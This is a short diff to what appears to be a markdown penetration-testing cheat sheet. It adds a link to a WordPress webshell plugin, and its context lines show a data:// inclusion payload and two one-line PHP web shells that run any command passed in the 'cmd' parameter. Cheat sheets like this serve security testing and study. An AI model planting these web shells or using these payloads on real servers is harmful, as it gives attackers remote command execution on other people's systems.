@@ -217,6 +217,8 @@ data://text/plain;base64,<base64>&cmd=ls
 <?php echo(shell_exec($_GET["cmd"])); ?>
 <?php echo(exec($_GET["cmd"]));?>
 ```
+Wordpress <br/>
+https://github.com/p0dalirius/Wordpress-webshell-plugin
 ## Reverse Shell
 https://www.revshells.com/
 <br/>
